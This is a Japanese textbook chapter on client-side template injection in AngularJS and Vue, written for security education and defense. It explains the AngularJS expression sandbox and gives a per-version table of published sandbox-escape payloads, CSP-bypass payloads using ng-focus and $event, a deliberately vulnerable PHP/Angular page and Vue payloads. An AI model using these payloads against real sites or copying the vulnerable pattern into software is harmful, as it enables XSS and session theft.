# 第5章 フレームワーク固有のXSS ― CSTI・React/Angular/Vue の非自明なsink

## クライアントサイドテンプレートインジェクション（CSTI / AngularJS）

### 概要

クライアントサイドテンプレートインジェクション（Client-Side Template Injection、以下 CSTI）は、AngularJS のようなクライアントサイド（ブラウザ側）のテンプレートフレームワークを使うアプリケーションが、ユーザー入力を動的にページへ埋め込んだときに発生する脆弱性である。PortSwigger の定義そのままに引けば「クライアントサイドテンプレートフレームワークを使うアプリケーションが、ユーザー入力を動的に Web ページへ埋め込むとき、CSTI 脆弱性が生じる」。

これらのフレームワークは、DOM に書き込まれた HTML をブラウザが読み込んだあとにスキャンし、`{{ ... }}` のようなテンプレート構文（AngularJS では「式（expression）」と呼ぶ）を見つけると、それを JavaScript 風の式として評価し、結果をページに埋め込む。もしユーザー入力が、フレームワークがテンプレートとしてスキャンする DOM 領域にサニタイズされずに挿入されると、攻撃者は `{{ }}` の中に任意の式を注入でき、フレームワーク自身にその式を実行させられる。

ここで決定的に重要なのは、**攻撃の sink（入力が最終的に実行・解釈される危険な代入先）が `innerHTML` のような明示的な JavaScript／HTML 実行 API である必要がない**という点である。テンプレートエンジンのコンパイル処理そのものが sink になる。これが「`<script>` タグやイベントハンドラ属性を注入する」従来型の XSS と根本的に異なる特徴であり、PortSwigger の研究論文タイトル「XSS without HTML（HTML なしの XSS）」が示すとおり、HTML インジェクションを一切使わずにコード実行へ到達できる。

しかも、この攻撃は **ユーザー入力が HTML エンコードされていても、かつ属性値の中にあっても成立しうる**。研究論文はこう述べている。「もしユーザー入力がページに直接埋め込まれるなら、そのアプリケーションはクライアントサイドテンプレートインジェクションに対して脆弱かもしれない。これはユーザー入力が HTML エンコードされ、属性の内側にあっても真である」。理由は後述するが、HTML エンコードは「HTML パーサに対する防御」であって、その後段で走る「Angular のテンプレートコンパイラ」に対しては無力だからである。

> 出典: Client-side template injection — https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection

### なぜ動くのか（仕組みレベルの説明）

通常の XSS は「ブラウザの HTML パーサ／JS パーサに、意図しないタグやスクリプトを解釈させる」ことが本質である。一方 CSTI は、そのパーサの手前に**もう一段、アプリケーション（フレームワーク）自身が実装したテンプレートコンパイラ**が挟まっている点が肝である。

AngularJS（v1.x 系）は起動時に、`ng-app` ディレクティブが指定された DOM ツリー全体（あるいは `$compile` を明示的に呼んだ範囲）を走査し、テキストノードや属性の中から `{{expr}}` というパターンを探す。見つけた式 `expr` は、素朴な `eval()` にかけられるのではなく、Angular 独自の**式パーサ（expression parser）**によって構文解析され、Angular の実行コンテキスト（`$scope`、フィルタ関数群）の中で評価される。処理の流れを分解すると次のようになる。

1. ブラウザの HTML パーサが DOM を構築する。この段階では `<script>` もイベントハンドラも不要で、単なるテキストとして `{{...}}` が DOM に入っていればよい。
2. Angular のコンパイラがそのテキストノード／属性を見つけ、`{{...}}` の中身を Angular 式として構文木（AST）に変換し、実行用の関数へコンパイルする。
3. その式が生成する値（多くの場合は関数呼び出しの戻り値）が、Angular のサンドボックス（1.6 未満）や信頼済みコンテキストのチェックを経て評価される。

したがって攻撃者は、自分が制御できる文字列が「AngularJS がコンパイル対象とみなす DOM 領域」に生の文字列として入りさえすれば、`<script>` タグや `onerror` 属性を一切使わずコード実行まで到達できる。これは「アプリケーション自身が用意した第二のインタプリタに、入力を再解釈させる」という一般化された脆弱性クラス（テンプレートインジェクション）の一種であり、サーバーサイドテンプレートインジェクション（SSTI、Jinja2 や FreeMarker など）と原理的にはまったく同じ構造を持つ。違いは実行される場所（ブラウザ内の JS 実行コンテキスト）だけである。

そして HTML エンコードが効かない理由もここにある。`{{7*7}}` を `&#123;&#123;7*7&#125;&#125;` のように文字参照でエンコードしても、ブラウザの HTML パーサはそれを **デコードして** テキストノード `{{7*7}}` を作る。Angular のコンパイラが見るのはそのデコード後のテキストなので、エンコードは素通りしてしまう。つまり「HTML エンコードは HTML 文脈の防御であって、テンプレート文脈の防御ではない」ということである。

### 基本的な検出手順

WAF やサニタイザがどの HTML タグ・属性をブロックしていても、CSTI は通常の HTML ペイロードとは別チャネルを通るため素通りしやすい。検出は算術式を注入するのが定石である。

```
{{7*7}}
```

このペイロードが反射された際に、リテラルの `{{7*7}}` ではなく `49` という数値が表示されれば、そのページはユーザー入力を AngularJS（あるいは同様の `{{ }}` 構文を持つ Vue などのフレームワーク）でコンパイルしている証拠であり、CSTI が成立する。なぜ動くかというと、AngularJS は文字列の中身がどんな意味を持つかを検査せず、構文的に `{{ }}` を見つけたら中の式を評価するため、算術式であっても実行されてしまうからである。同様に `{{1+1}}` は `2` を返す。

いったん `{{7*7}}=49` が確認できたら、次は Angular のバージョンによって「どこまで踏み込めるか」が変わる。ページに読み込まれている `angular.min.js` のバージョン、あるいは `angular.version` の値を確認するのが次の一手になる。

### AngularJS のサンドボックス機構

なぜバージョンごとにペイロードが変わるのか。それは AngularJS が「式サンドボックス（expression sandbox）」という仕組みを持ち、その実装が版ごとに強化・修正されてきたからである。

サンドボックスは、テンプレート式から `window`・`document`・DOM 要素・`Function` コンストラクタなどの「危険なオブジェクト」へのアクセスと、`__proto__` などの「危険なプロパティ」へのアクセスを遮断しようとする防御機構である。式パーサは構文木を作る際に、安全確認のためのチェック関数呼び出しを式のコードへ差し込む。主なチェック関数は次のとおり。

- **`ensureSafeObject()`**: 評価対象のオブジェクトが `Function` コンストラクタ、`window` オブジェクト、DOM 要素、`Object` コンストラクタのいずれかでないかを検査し、該当すれば例外を投げる。
- **`ensureSafeMemberName()`**: `__proto__` のような危険なプロパティ名へのアクセスを禁止する。
- **`ensureSafeFunction()`**: `Function` コンストラクタや `call()`・`apply()`・`bind()`・`constructor()` の呼び出しを遮断する。

つまり `{{constructor.constructor('alert(1)')()}}`（後述する `Function` コンストラクタ経由でのコード実行）のような「素朴な」ペイロードは、サンドボックスが有効なバージョンではこれらのチェックに引っかかって失敗する。サンドボックスを突破する（escape する）には、これらのチェック自体を無効化するか、チェックの盲点を突く必要があった。

そして重要な結論として、**Angular チームは 1.6（2017 年頃）でサンドボックスを完全に撤廃した**。これは「サンドボックスは攻撃者を止めることを意図したものではない」という設計判断による恒久的な仕様変更である。研究論文はこう記す。「Angular はバージョン 1.6 の時点でサンドボックスを完全に取り除いた」。したがって以降のペイロード表は「サンドボックスが有効だった 1.0〜1.5 系ではどう回避したか」という歴史であり、1.6 以降では回避すら不要になる。

> 出典: XSS without HTML: Client-Side Template Injection with AngularJS — https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs

### サンドボックス回避の中核原理: `charAt` の破壊

数々の回避手法のうち、Gareth Heyes（PortSwigger）が発見しのちの多数のペイロードの土台になった中核テクニックが、**ネイティブの `String.prototype.charAt` を書き換えてパーサのロジックを壊す**手法である。原典から引くと、突破口となったのは次のような一行だった。

```
'a'.constructor.prototype.charAt=[].join
```

なぜこれが効くのか。Angular の式パーサは、識別子（変数名など）を読み取る際に `isIdent()` という関数で「その文字が識別子として妥当か」を判定する。`isIdent` は概ね次のような比較を行う。

```
('a' <= ch && ch <= 'z' || 'A' <= ch && ch <= 'Z' || '_' === ch || ch === '$')
```

ここで `ch` は、入力文字列から `charAt()` で 1 文字ずつ取り出したものである。ところが `charAt` を `[].join`（配列の `join` メソッド）に差し替えると、`charAt` を呼んだときに「引数を連結した文字列」が返るようになる。たとえば本来 1 文字 `'x'` を返すはずの箇所で、`'x=alert(1)'` のような長い文字列が返ってしまう。

それでも `isIdent` の比較は、返ってきた文字列の**先頭 1 文字**だけを境界値と比べるため、`'x=alert(1)'` の先頭が `'x'`（`'a'`〜`'z'` の範囲内）である以上、判定は通過してしまう。ところがパーサはその後、`isIdent` が真だった元の文字列全体を識別子名として使ってしまうため、`x=alert(1)` というコードが、生成される関数の中に丸ごと注入される。これがサンドボックスチェックの手前で「識別子だと誤認させる」ことによる回避の本質である。

この `charAt` 破壊を仕込んだうえで、次のように Angular の `$eval()`（式を評価する内部 API）を呼び、任意コードを実行する。

```
$eval('x=alert(1)')
```

さらに、クォートが使えない環境では `String.fromCharCode()` を `constructor` 経由で組み立てて文字列を生成し、`$eval()` の代わりに `orderBy` フィルタを使う手もある。AngularJS ではパイプ記号 `|` がフィルタ適用を意味し、`orderBy` フィルタは式を受け取れるため、これがペイロードの注入口になる。

```
[123]|orderBy:'Some string'
```

### `constructor.constructor` チェーンによる Function 到達

より初期のバージョンでは、`constructor.constructor` というプロパティチェーンをたどって `Function` コンストラクタへ直接到達し、任意コードを実行できた。

```
{{constructor.constructor('alert(1)')()}}
```

なぜ動くのか。JavaScript では、任意のオブジェクトの `constructor` はそれを生成した関数を指し、関数の `constructor` はさらに `Function`（＝ JavaScript のコード文字列から関数を生成できる、`eval` 相当の危険なコンストラクタ）を指す。したがって `constructor.constructor('alert(1)')` は `Function('alert(1)')` と等価な新しい関数を作り、末尾の `()` でそれを即時実行する。サンドボックスはまさにこの経路（`Function` への到達）を塞ごうとしたため、後続バージョンではこのペイロードが通らなくなり、前述の `charAt` 破壊のような迂回が必要になった。そして 1.6 でサンドボックスが撤廃された結果、この最もシンプルなペイロードが再び有効になったのは皮肉である。

### バージョン別サンドボックス回避ペイロード一覧

以下は研究論文が掲載しているバージョン別の回避ペイロードである。各行末の括弧内は発見者。これらは公開済みの研究資料に掲載された「歴史的記録」であり、対象バージョンと発見者を明記して引用する。実運用の AngularJS はいずれも保守終了（EOL、2022 年 1 月にサポート終了）しているため、これらは主に「どのバージョンのサンドボックスがどう破られたか」という原理理解のための資料と位置づけてほしい。

**1.0.1 – 1.1.5**（Mario Heiderich / Cure53）:
```
{{constructor.constructor('alert(1)')()}}
```

**1.2.0 – 1.2.1**（Jan Horn / Google）:
```
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

**1.2.2 – 1.2.5**（Gareth Heyes / PortSwigger）:
```
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window.x)alert(window.x=1)')+eval(y)+"'");}}
```

**1.2.6 – 1.2.18**（Jan Horn / Google）:
```
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

**1.2.19 – 1.2.23**（Mathias Karlsson）:
```
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

**1.2.24 – 1.2.29**（Gareth Heyes / PortSwigger）:
```
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window.x)alert(window.x=1)')+eval(y)+\"'");}}
```

**1.3.0**（Gábor Molnár / Google）:
```
{{!ready && (ready = true) && (!call ? $$watchers[0].get(toString.constructor.prototype) : (a = apply) && (apply = constructor) && (valueOf = call) && (''+''.toString('F = Function.prototype;F.apply = F.a;delete F.a;delete F.valueOf;alert(1);')))}}
```

**1.3.1 – 1.3.2**（Gareth Heyes / PortSwigger）:
```
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf;$eval('x=alert(1)//');}}
```

**1.3.3 – 1.3.18**（Gareth Heyes / PortSwigger）:
```
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}
```

**1.3.19**（Gareth Heyes / PortSwigger）:
```
{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}
```

**1.3.20**（Gareth Heyes / PortSwigger）:
```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

**1.4.0 – 1.4.9**（Gareth Heyes / PortSwigger）:
```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}
```

**1.5.0 – 1.5.8**（Ian Hickey）:
```
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)')}}
```

**1.5.9 – 1.5.11**（Jan Horn / Google）:
```
{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';astNode.argument={type:'Identifier',name:'foo'};");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}
```

**>= 1.6.0**（Mario Heiderich / Cure53）:
```
{{constructor.constructor('alert(1)')()}}
```

この一覧から読み取れる重要な傾向は 2 つある。第一に、`charAt` 破壊系（Gareth Heyes 由来）が 1.2.24 以降 1.5 系まで系譜として続いていること。バージョンが上がるたびにサンドボックスが `charAt` の書き換えを検知・防御しようとし、それをさらに一手ずらして回避する、というイタチごっこが見て取れる。第二に、最初（1.0 系）と最後（1.6 以降）のペイロードが同一の `{{constructor.constructor('alert(1)')()}}` である点。これは「サンドボックスが無かった時代に戻った」ことを意味し、サンドボックスという防御の努力が結局は放棄された歴史を象徴している。

### サニタイザ破壊（`charCodeAt` の書き換え）

`charAt` を壊す発想は、Angular の**サニタイザ**（`ngSanitize` / `$sanitize`。HTML を安全化してから出力する機構）を壊すことにも応用できる。研究論文は、サニタイザ内部の `encodeEntities` 関数が呼ぶ `charCodeAt` を書き換えることで属性を注入する手法を示している。

```
'a'.constructor.charCodeAt=[].concat;
```

これを仕込むと、`charCodeAt(0)` が「数値の文字コード」ではなく「連結された文字列＋引数」を返すようになる。`encodeEntities` は文字を数値コードに変換してエンティティ化することで危険文字を無害化しているが、そのコードが数値でなく文字列になってしまうと、エンティティ化のロジックが破綻し、属性のサニタイズをすり抜けられる。`charAt` のときと同じく「ネイティブメソッドの戻り値の型・意味を書き換えて、後段のロジックの前提を崩す」という共通原理である。

### CSP バイパス

AngularJS が読み込まれているサイトでは、コンテンツセキュリティポリシー（CSP）を回避できる場合がある。CSP は `script-src` で許可されたソース以外のスクリプト実行を禁じるが、Angular 式の評価はあくまで「すでに許可されて読み込まれた Angular ライブラリ自身が行う内部処理」なので、外部スクリプトの追加を禁じる CSP をすり抜けうる。研究論文が示す代表的な手口を 2 つ挙げる。

**手口 1: `$event.path` を使う**

```
<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
```

`ng-focus` はフォーカス時に発火する Angular のイベントディレクティブで、`autofocus` によって自動的にフォーカスが当たり式が評価される。`$event` オブジェクトはイベント情報を保持しており、その `path` 配列（イベントの伝播経路）の最後の要素が `window` オブジェクトになる。`orderBy` フィルタに渡された式の中で `[].constructor.from([1], alert)`（`Array.from` に配列とコールバック `alert` を渡す形）を使うと、`from()` が配列の各要素を処理する過程で `window` をサンドボックスの検知から隠しつつ `alert` を呼び出せる。

**手口 2: `array.map()` を使う**

```
[1].map(alert)
```

これは `alert` を間接的に呼ぶ手法で、`window.alert` のように `window` を明示的に書かないため、`window` を検知しようとするサンドボックスをすり抜けられる。`[1].map(alert)` は配列 `[1]` の各要素に `alert` を適用するので、実質的に `alert(1)` が呼ばれる。

### バージョンと修正のタイムライン

サンドボックス回避と修正の経緯は、研究がベンダーと連携して進められたことを示している。

- **2015 年 9 月 25 日**: サンドボックス回避が Google に非公開で報告される。
- **2016 年 1 月 15 日**: Google がバージョン 1.5.0 を修正（前掲の 1.5.0–1.5.8 用ペイロードはこの修正後を対象とするもの）。
- **2016 年 9 月（Angular 1.6）**: サンドボックスを完全に撤廃。以降、回避テクニックそのものが不要になった。

なお、AngularJS（1.x 系）全体のサポートは 2022 年 1 月に終了している。現行の Angular（2 以降）は別アーキテクチャであり、`{{ }}` の式評価も本節で扱った 1.x 系のサンドボックスとは仕組みが異なる（Angular 2+ 特有の問題は別節で扱う）。

### 影響

CSTI で到達できるのは被害者ブラウザ内での任意 JavaScript 実行であり、実害は通常の反射型・格納型 XSS と同種である。すなわち Cookie／セッショントークンの窃取、セッションハイジャック、被害者権限での操作の代行、フィッシング的な DOM 改ざんなどに及ぶ。特筆すべきは、**HTML タグやイベントハンドラを一切使わずに** これらへ到達できる点で、`<`・`>`・`"` などをすべてエスケープする従来型 XSS 対策や、`<script>` を除去するタグ単位のサニタイザを完全にすり抜ける。テンプレート構文というまったく別のチャネルを使うためである。

### 防御

PortSwigger のガイダンスは明快である。まず「テンプレートや式を生成するのにユーザー入力を使わない」ことが第一原則である。そのうえで、

- **テンプレート構文をユーザー入力から除去する**。中括弧 `{{` `}}` を含むユーザー入力を「非常に危険」なものとして扱い、テンプレート化される領域へ入れる前にテンプレート構文を除去する。研究論文は端的に、中括弧を含む入力を highly dangerous とみなすか、そもそもユーザー入力をサーバー側で反射しないことを推奨している。
- **HTML エンコードに頼らない**。「HTML エンコードだけでは不十分」である。前述のとおり、フレームワークが式を評価する前にブラウザがエンコードをデコードしてしまうため、HTML エンコードは CSTI に対する防御にならない。
- **サニタイズ対象領域を Angular のコンパイル対象から外す**。信頼できないコンテンツを描画する領域には `ng-non-bindable` を付与する、あるいはそもそも `ng-app` のスコープ外へ配置する、といった設計上の分離が有効である。
- **フレームワークのパッチ管理を徹底する**。ただし研究論文が警告するとおり、「Angular を更新するだけでは不十分」であり、式インジェクションという根本問題に対処しない限り安全にはならない。Angular 公式ドキュメントは、ユーザー入力をテンプレートに動的に埋め込むことを戒める一方で、「Angular が安全なコードに XSS を持ち込むことはない」と誤解を招く書き方をしている、と研究論文は指摘している。フレームワークの安全機構を過信しないことが肝要である。

> 出典: XSS without HTML: Client-Side Template Injection with AngularJS — https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs

### まとめ

CSTI の本質は「ブラウザの HTML／JS パーサの手前に、フレームワーク独自のテンプレートインタプリタがもう一段存在し、そこがコード実行の sink になる」という二重構造にある。この構造ゆえに、HTML エンコードやタグ除去といった従来型 XSS 対策は無力化される。AngularJS 1.x のサンドボックスは `window`・`Function`・`__proto__` などへの到達を防ごうとしたが、`charAt`・`charCodeAt` などネイティブメソッドの戻り値の意味を書き換えてパーサ自身のロジックを崩す手法によって版ごとに突破され、最終的に 1.6 でサンドボックスは撤廃された。防御の要点は、テンプレート構文をユーザー入力に持ち込ませないこと、そして「HTML エンコードやフレームワークの安全機構が守ってくれる」という前提を捨てることである。

---

前へ: [第4章 高度な回避技術](04-advanced.md) ｜ [目次](index.md) ｜ 次へ: [CSTI補足（HackTricks / Beyond XSS）](#csti補足)

---

## CSTI補足（HackTricks / Beyond XSS）

前節でCSTI（Client Side Template Injection、クライアントサイド・テンプレートインジェクション）の基本を見た。本節では、HackTricksの技術資料とBeyond XSSの実例をもとに、AngularJSを中心とした攻撃の「仕組み」をもう一段深く掘り下げる。具体的には、なぜテンプレート構文がXSSサニタイズをすり抜けるのか、AngularJSのサンドボックスがどのように作られどのように破られたのか、CSPが張られていてもコード実行できてしまうのはなぜか、という3点を中心に整理する。

### CSTIとSSTI・通常のXSSとの違い

まず用語を整理する。SSTI（Server Side Template Injection）はサーバー側のテンプレートエンジン（Jinja2、Twigなど）にユーザー入力がテンプレート文字列として渡り、サーバー上で任意コード実行に至る脆弱性である。CSTIはその「クライアント版」で、AngularJSやVue.jsのようなフロントエンドのテンプレートエンジンに、データではなく**テンプレートそのもの**としてユーザー入力が渡ってしまうことで、ブラウザ内で任意のJavaScriptが実行される。

ここが通常の「素朴な反射型XSS」との決定的な違いだ。素朴なXSSは `<script>` タグや `onerror` 属性など、ブラウザのHTMLパーサ・DOM APIに直接コードを注入する。一方CSTIは、まずアプリケーションが読み込んでいるテンプレートエンジン（AngularJSなど）にとって「これは評価すべき式である」と認識される構文（`{{ ... }}` など）を注入し、テンプレートエンジン自身の評価器にコードを解釈させる。つまり攻撃者はブラウザのHTMLパーサではなく、**アプリケーションが信頼している別のインタプリタ**を乗っ取っているという点で、mXSS（第4章）とよく似た「二重解釈」の構造を持つ。

HackTricksの記述を借りれば、"Angular templates are considered trusted by default, and should be treated as executable code."（Angularのテンプレートはデフォルトで信頼されるものとして扱われ、実行可能コードとして扱うべきである）という前提がある。つまりAngularJSの設計思想として「テンプレート＝開発者が書くもの＝信頼できるもの」という切り分けがあり、ユーザー入力がテンプレート文字列そのものに混入するケースは想定されていない。この前提が崩れたときにCSTIが発生する。

> 出典: Client Side Template Injection (CSTI) - HackTricks — https://hacktricks.wiki/en/pentesting-web/client-side-template-injection-csti.html

### 脆弱なコードの具体例（AngularJS）

Beyond XSSが示す最小構成の脆弱コードは以下のようなものである。

```html
<!DOCTYPE html>
<html>
<body>
  <div ng-app>
    Hello, <?php echo htmlspecialchars($_GET['name']) ?>
  </div>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
</body>
</html>
```

一見すると `htmlspecialchars()` でエスケープしているため、`<script>alert(1)</script>` のような入力は `&lt;script&gt;...` に変換され安全に見える。しかし `htmlspecialchars()` が変換対象とするのは `<`, `>`, `&`, `"` などのHTML特殊文字であり、`{`、`}`、`(`、`)` は変換対象外である。したがって `name` パラメータに

```
{{constructor.constructor('alert(1)')()}}
```

を渡すと、HTMLエスケープを通過したままページに出力される。ここが `<div ng-app>` の内部であるため、AngularJSがページをスキャンした際にこの `{{ ... }}` を「評価すべきAngular式」として認識し、内部のJavaScript式を実行してしまう。

**なぜ動くか**: AngularJSは `ng-app` が指定された要素の配下をコンパイルする際、テキストノードやバインディング対象の中から `{{ 式 }}` という区切り文字（デフォルトのinterpolation記号）を探索し、その中身をAngular式パーサに渡して評価・監視（watch）する。これはHTMLエスケープの後工程、つまりDOMに文字列がテキストとして挿入された**後**に、AngularJS自身のフレームワークコードが行う処理である。よって「HTMLタグとして解釈されないようにエスケープする」という通常のXSS対策は、そもそもこの攻撃経路には無関係であり、防御として機能しない。ここがCSTIの本質的な怖さであり、「入力をエンコードしたから安全」という思い込みを裏切る典型例である。

> 出典: Template Injection in Frontend: CSTI | Beyond XSS — https://aszx87410.github.io/beyond-xss/en/ch3/csti/

### `constructor.constructor` はなぜ`alert`を呼び出せるのか

ペイロード `{{constructor.constructor('alert(1)')()}}` の仕組みをJavaScriptの言語仕様レベルで説明する。

- 任意のオブジェクトの `.constructor` はそのオブジェクトを作った関数（多くの場合 `Object` や `Function` の派生）を指す。
- 関数オブジェクト自身の `.constructor` は `Function` コンストラクタそのものである。つまり `x.constructor.constructor` は最終的に `Function` に到達する。
- `Function('alert(1)')` は、文字列 `'alert(1)'` をボディとする新しい関数を動的に生成する。これは `eval` と同様に任意の文字列をコードとして実行できる強力な機能である。
- 生成された関数の末尾に `()` を付けて即座に呼び出すことで `alert(1)` が実行される。

つまりこのペイロードは「どんな値からでもたどり着ける `Function` コンストラクタを使い、文字列を実行可能コードに変える」という、JavaScriptのプロトタイプチェーンを利用したサンドボックスエスケープの定石パターンである。AngularJSの式パーサはこの式全体を通常のJavaScriptプロパティアクセス・関数呼び出しとして解釈し、内部で実質的に `Function('alert(1)')()` を実行してしまう。

### AngularJSサンドボックスの歴史とバージョン依存性

AngularJS 1.2.0〜1.5.xの時代には、上記のような `window` や `Function` への到達を防ぐための「式サンドボックス（expression sandbox）」が実装されていた。PortSwigger Web Security Academyの解説によれば、このサンドボックスは主に3つの防御関数から構成されていた。

- **`ensureSafeObject()`**: 自己参照するオブジェクト（`window` はプロパティの中に自分自身への参照を持つ）を検出してブロックする。
- **`ensureSafeMemberName()`**: `__proto__` や `__lookupGetter__` のような危険なプロパティ名へのアクセスをブロックする。
- **`ensureSafeFunction()`**: `call()`、`apply()`、`bind()`、`constructor()` の呼び出しをブロックする。

しかし、これらは「既知の危険パターンをブロックするブラックリスト方式」であったため、セキュリティ研究者による回避策の発見が続いた。代表的な回避手法の一つが、グローバルな `String.prototype.charAt`（正確には研究例では `'a'.constructor.prototype.charAt`）を書き換える手法である。

```
'a'.constructor.prototype.charAt=[].join
```

**なぜ動くか**: これは `String.prototype.charAt` メソッドを配列の `join` メソッドで上書きしてしまう式である。AngularJSの式パーサ内部では、字句解析の過程で `isIdent()` のような関数が文字列を1文字ずつ `charAt()` で読み取り、識別子（変数名として妥当な文字列）かどうかを判定していた。`charAt` の挙動を `join`（引数を無視してすべての要素を連結して返す）にすり替えることで、本来1文字を返すべき箇所で文字列全体が返るようになり、`isIdent()` の判定ロジックが壊れる。その結果、本来なら危険と判定されるはずの式が「安全な識別子」として通過してしまい、後続で `$eval('x=alert(1)')` のようなコードを注入できるようになる。

さらに引用符がフィルタされている状況では、`String.fromCharCode()` を使って文字コードから文字列を組み立て、`$eval` が使えない文脈では `orderBy` フィルタ（`|` 記法でパイプ処理される、配列の並び替えを行う組み込みフィルタ）を式評価のトリガーとして悪用する手法も報告されている。

```
[123]|orderBy:'Some string'
```

このように、AngularJSサンドボックスとの攻防は「フレームワーク側がブラックリストを強化する→研究者が新しい迂回路を見つける」といういたちごっこが続いた。最終的にAngularJS開発チームは、"the sandbox is not actually a security feature"（このサンドボックスは実際にはセキュリティ機能ではない）という立場を取り、**AngularJS 1.6以降でサンドボックス自体を完全に撤廃**した。1.6以降では最初からサンドボックスによる保護がないため、`{{constructor.constructor('alert(1)')()}}` のような最も単純な形のペイロードがそのまま通る。逆に1.2.x〜1.5.x系の古いAngularJSアプリケーションを診断する場合は、対象バージョンごとに有効なサンドボックス回避ペイロードが異なる点に注意が必要で、バグバウンティやペネトレーションテストの実務では、まずAngularJSのバージョンを特定し、そのバージョンで報告済みの回避策を辞書的に試すというアプローチが取られる。

> 出典: Client-Side Template Injection: AngularJS - PortSwigger Web Security Academy — https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection

### CSPが有効でもコード実行できてしまう仕組み

CSTIが特に危険視される理由の一つが、CSP（Content Security Policy）による `unsafe-eval` や `unsafe-inline` の禁止が防御にならないケースがある点である。

AngularJSには `ng-csp` という属性があり、これを指定すると「CSPに準拠したモード」で動作する。このモードでは `Function` コンストラクタや `eval` を直接使わずに式を評価するよう内部実装が切り替わる。つまり `ng-csp` モードで動いているAngularJSは、CSPの `script-src` に `unsafe-eval` がなくても、独自のインタプリタ（式パーサ／評価器）でテンプレート式を解釈・実行できてしまう。これはCSPが制限しているのは「ブラウザネイティブの `eval`/`Function` の呼び出し」であって、「JavaScriptで書かれた自作インタプリタが文字列をパースして処理を分岐させること」自体はCSPの制御対象外だからである。第4章で扱ったCSPバイパスの一般原則（「CSPは特定のAPI呼び出し経路を塞ぐものであり、アプリケーションロジックそのものは検閲できない」）がここでも当てはまる。

具体的なCSPバイパスの一つが `$event` オブジェクトを利用する手法である。AngularJSはイベントハンドラ式の中で特殊な `$event` 変数（ブラウザのネイティブイベントオブジェクトへの参照）を提供する。Chromeでは、イベントオブジェクトの `path` プロパティ（バブリングの経路を表す配列）の末尾に `window` オブジェクトが含まれることを利用し、以下のようなペイロードで `window` への参照をサンドボックス検知に引っかからない形で取り出せる。

```html
<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
```

**なぜ動くか**: `$event.path` から `window` を含む配列を取得し、`orderBy` フィルタの引数として `[].constructor.from([1], alert)` を渡している。`[].constructor` は `Array` であり、`Array.from(iterable, mapFn)` は第2引数の関数を各要素に適用しながら配列を生成するAPIである。つまりここでは `Array.from([1], alert)` として `alert` を要素 `1` に適用する形で呼び出し、明示的に `window.alert(...)` や `alert(...)` という危険な字面を式中に書かずに、間接的に `alert` 関数を実行させている。ブラックリスト型のフィルタは「危険な識別子やパターンの字面」を検出しようとするため、このように処理を細かく分解して間接呼び出しにすることで検出をすり抜けられる。

HackTricksが挙げるもう一つのCSP回避例は次のようなものである。

```html
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;
d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'">
</textarea></div>
```

これは `$event.view`（イベント発生元のウィンドウオブジェクト）経由で `document` を取得し、`location` を書き換えて外部ホストへリダイレクトさせる、より実戦的な悪用例である。`ng-csp` が指定されていても、これらは通常のJavaScript実行としてではなく、AngularJSの式評価器の中で完結する処理として実行されるため、CSPの `script-src` 制限では止められない。

さらに、CSPの `script-src` に `https://cdnjs.cloudflare.com` のような一般的なCDNドメインがホワイトリスト登録されている場合、そのドメインから配信されているAngularJS自体を読み込むタグ（`<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.x.x/angular.min.js">`）もCSP的には「許可されたスクリプト」として通ってしまう。つまり攻撃者は、ページに元々AngularJSが使われていなくても、CSPで許可されたCDN経由でAngularJS自体を注入し、その上でCSTIペイロードを実行するという合わせ技が成立し得る。これは第4章で扱った「JSONP/ホワイトリストされたスクリプトホストを踏み台にしたCSPバイパス」と同じ発想であり、CSPの `script-src` にライブラリ配信用CDNを緩く許可することの危険性を示す典型例である。

> 出典: Client Side Template Injection (CSTI) - HackTricks — https://hacktricks.wiki/en/pentesting-web/client-side-template-injection-csti.html

### VueJS・他フレームワークでのCSTI

CSTIはAngularJS特有の問題ではなく、「テンプレート文字列をエンジンに評価させる」設計を持つフレームワーク全般に潜在する。HackTricksはVue.jsについても以下のような等価ペイロードを挙げている。

- Vue 2系: `{{constructor.constructor('alert(1)')()}}`（AngularJSと同じ `Function` コンストラクタ到達パターン）
- Vue 3系: `{{_openBlock.constructor('alert(1)')()}}`（Vue 3の内部APIである `_openBlock` を起点に同様のプロトタイプチェーンをたどる）
- 属性経由: `"><div v-html="''.constructor.constructor('...')()"> aaa</div>`（`v-html` ディレクティブの式評価を悪用する例）

